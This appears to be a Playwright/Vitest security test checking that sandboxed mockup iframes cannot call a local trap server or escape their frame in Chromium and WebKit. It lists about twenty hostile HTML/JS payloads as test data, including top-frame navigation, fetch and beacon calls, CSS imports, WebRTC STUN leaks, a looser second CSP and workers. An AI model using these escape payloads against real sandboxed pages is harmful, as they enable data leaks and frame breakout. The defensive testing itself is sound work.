// Spec 21 criterion 1 (ADR 0472, review of #90): a hostile mockup, loaded in a real browser engine
// the way the app draws it, can't call home or leave its frame. A trap server (HTTP and UDP) on
// another port records anything that reaches it; each hostile mockup tries a different way out.
// After each, the trap must have seen nothing, the app page must be where it was, and the inner
// frame must still be the mockup.
import { createSocket } from "node:dgram";
import { createServer, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import { type Browser, chromium, type Page, webkit } from "playwright";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { outerDocument } from "../src/mainview/lib/mockup-frame.ts";

const hits: string[] = [];
let trap: Server;
let app: Server;
let TRAP = "";
let UDP = 0;
let APP = "";
let page = "";
let udp = createSocket("udp4");

const attr = (t: string) =>
  t.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

/** The hostile mockups, by the way out each tries. */
const cases = (): Record<string, string> => ({
  "meta refresh": `<meta http-equiv="refresh" content="0;url=${TRAP}/refresh">`,
  "location =": `<script>location.href = "${TRAP}/location"</script>`,
  "location.replace and assign": `<script>setTimeout(() => { try { location.replace("${TRAP}/replace") } catch {} try { location.assign("${TRAP}/assign") } catch {} }, 50)</script>`,
  "window.open": `<script>window.open("${TRAP}/open"); window.open("${TRAP}/open2", "_top")</script>`,
  "form submit": `<form action="${TRAP}/form" method="post" target="_top"><input name="a" value="1"></form><form id="f2" action="${TRAP}/form2"></form><script>document.forms[0].submit(); document.getElementById("f2").submit()</script>`,
  "link click to top": `<a id="a" href="${TRAP}/link" target="_top">x</a><a id="b" href="${TRAP}/link2">y</a><script>document.getElementById("a").click(); setTimeout(() => document.getElementById("b").click(), 30)</script>`,
  "img and Image()": `<img src="${TRAP}/img"><script>new Image().src = "${TRAP}/image"</script>`,
  "fetch, XHR, beacon, websocket, EventSource": `<script>
    try { fetch("${TRAP}/fetch").catch(() => {}) } catch {}
    try { const x = new XMLHttpRequest(); x.open("GET", "${TRAP}/xhr"); x.send() } catch {}
    try { navigator.sendBeacon("${TRAP}/beacon", "s") } catch {}
    try { new WebSocket("${TRAP.replace("http", "ws")}/ws") } catch {}
    try { new EventSource("${TRAP}/sse") } catch {}
  </script>`,
  "css url, @import and font": `<style>@import url("${TRAP}/import.css"); @font-face { font-family: t; src: url("${TRAP}/font.woff2") } body { background: url("${TRAP}/css.png"); font-family: t }</style><link rel="stylesheet" href="${TRAP}/style.css">`,
  "DNS prefetch": `<link rel="dns-prefetch" href="${TRAP.replace("127.0.0.1", "trap-dns.invalid")}"><link rel="dns-prefetch" href="${TRAP}">`,
  "prefetch and preload": `<link rel="prefetch" href="${TRAP}/prefetch"><link rel="preload" as="image" href="${TRAP}/preload"><link rel="preconnect" href="${TRAP}"><link rel="icon" href="${TRAP}/icon.png">`,
  "WebRTC to a STUN server": `<script>try { const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${UDP}" }] }); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)) } catch {}</script>`,
  "WebRTC from a fresh iframe": `<script>try { const f = document.createElement("iframe"); document.body.appendChild(f); const P = f.contentWindow.RTCPeerConnection; const pc = new P({ iceServers: [{ urls: "stun:127.0.0.1:${UDP}" }] }); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)) } catch {}</script>`,
  "WebRTC through frames[0] and a named frame": `<div id="h"></div><script>try { document.getElementById("h").innerHTML = '<iframe name="w"></iframe>'; for (const win of [frames[0], window.w]) { try { const pc = new win.RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${UDP}" }] }); pc.createDataChannel("x"); pc.createOffer().then((o) => pc.setLocalDescription(o)) } catch {} } } catch {}</script>`,
  "a second, looser CSP": `<meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'"><img src="${TRAP}/csp2"><script>fetch("${TRAP}/csp2-fetch").catch(() => {})</script>`,
  "base href": `<base href="${TRAP}/"><img src="base.png"><script>fetch("relative").catch(() => {})</script>`,
  "top and parent navigation": `<script>for (const w of [top, parent, parent.parent]) { try { w.location = "${TRAP}/top" } catch {} } try { parent.location.href = "${TRAP}/parent" } catch {}</script>`,
  "nested frames": `<iframe src="${TRAP}/iframe"></iframe><iframe srcdoc="<img src='${TRAP}/nested-img'>"></iframe><object data="${TRAP}/object"></object><embed src="${TRAP}/embed">`,
  "a worker": `<script>try { new Worker(URL.createObjectURL(new Blob(["fetch('${TRAP}/worker')"]))) } catch {} try { new Worker("${TRAP}/worker.js") } catch {}</script>`,
  media: `<video src="${TRAP}/video.mp4" autoplay></video><audio src="${TRAP}/audio.mp3" autoplay></audio>`,
});

function appPage(mockup: string): string {
  const doc = `<!doctype html><html><body data-mockup="1"><h1>Mockup</h1>${mockup}</body></html>`;
  return `<!doctype html><html><body><iframe id="outer" sandbox="allow-scripts" referrerpolicy="no-referrer" style="width:800px;height:600px" srcdoc="${attr(outerDocument(doc))}"></iframe></body></html>`;
}

beforeAll(async () => {
  trap = createServer((req, res) => {
    hits.push(`${req.method} ${req.url}`);
    res.writeHead(200, { "content-type": "text/html" });
    res.end("<h1>trap</h1>");
  });
  await new Promise<void>((r) => trap.listen(0, "127.0.0.1", r));
  TRAP = `http://127.0.0.1:${(trap.address() as AddressInfo).port}`;
  app = createServer((_req, res) => {
    res.writeHead(200, { "content-type": "text/html" });
    res.end(page);
  });
  await new Promise<void>((r) => app.listen(0, "127.0.0.1", r));
  APP = `http://127.0.0.1:${(app.address() as AddressInfo).port}/`;
});

afterAll(async () => {
  trap.close();
  app.close();
  udp.close();
});

async function stillTheMockup(p: Page): Promise<boolean> {
  const outer = p.frames().find((f) => f.parentFrame() === p.mainFrame());
  const inner = outer?.childFrames()[0];
  if (!inner) return false;
  // The mockup, or (one that keeps trying to navigate) the notice that it was stopped: never
  // another page.
  return inner
    .evaluate(
      () => document.body?.dataset.mockup === "1" || document.body?.dataset.mockupStopped === "1",
    )
    .catch(() => false);
}

for (const [engine, launcher] of [
  ["chromium", chromium],
  ["webkit", webkit],
] as const) {
  describe(`a hostile mockup in ${engine}`, () => {
    let browser: Browser;
    beforeAll(async () => {
      browser = await launcher.launch();
    });
    afterAll(async () => {
      await browser.close();
    });

    // MOCKUP_REPEAT=20 runs each case 20 times (the flake check for review of #90).
    const repeat = Number(process.env.MOCKUP_REPEAT ?? 1);
    for (const name of Object.keys(cases()).flatMap((n) =>
      Array.from({ length: repeat }, () => n),
    )) {
      it(`can't get out by ${name}`, async () => {
        // A UDP port of its own per case: a previous case's late STUN retries can't count here.
        udp.close();
        udp = createSocket("udp4");
        udp.on("message", () => hits.push("udp"));
        await new Promise<void>((r) => udp.bind(0, "127.0.0.1", r));
        UDP = udp.address().port;
        hits.length = 0;
        page = appPage(cases()[name] ?? "");
        const context = await browser.newContext();
        const p = await context.newPage();
        const opened: string[] = [];
        context.on("page", (q) => opened.push(q.url()));
        // The app page itself, not every subframe (a hostile one may never finish loading).
        await p.goto(APP, { waitUntil: "domcontentloaded", timeout: 20_000 });
        await p.waitForTimeout(2_500);
        expect(hits).toEqual([]);
        expect(opened).toEqual([]);
        expect(p.url()).toBe(APP);
        expect(await stillTheMockup(p)).toBe(true);
        await Promise.race([context.close(), new Promise((r) => setTimeout(r, 5_000))]);
      });
    }
  });
}
